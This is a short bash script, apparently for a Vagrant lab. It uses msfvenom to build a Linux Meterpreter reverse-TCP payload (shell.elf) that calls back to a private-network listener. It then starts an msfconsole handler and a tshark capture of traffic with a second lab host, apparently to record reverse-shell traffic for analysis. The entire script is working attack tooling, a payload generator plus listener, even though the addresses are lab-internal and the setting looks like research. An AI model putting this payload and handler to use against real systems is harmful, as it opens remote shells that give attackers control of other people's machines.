#!/bin/bash

msfvenom --payload linux/x64/meterpreter/reverse_tcp --platform linux --arch x64 LHOST=192.168.56.33 LPORT=7890 -f elf > /vagrant/data/shell.elf

tmux new-session -d -s collector -n listener 'msfconsole -r /vagrant/handler.rc'
tmux new-window -t collector -n tshark 'tshark -i eth1 -f "tcp and host 192.168.56.44" -c 3000 -w /vagrant/data/rec.pcap'
tmux ls
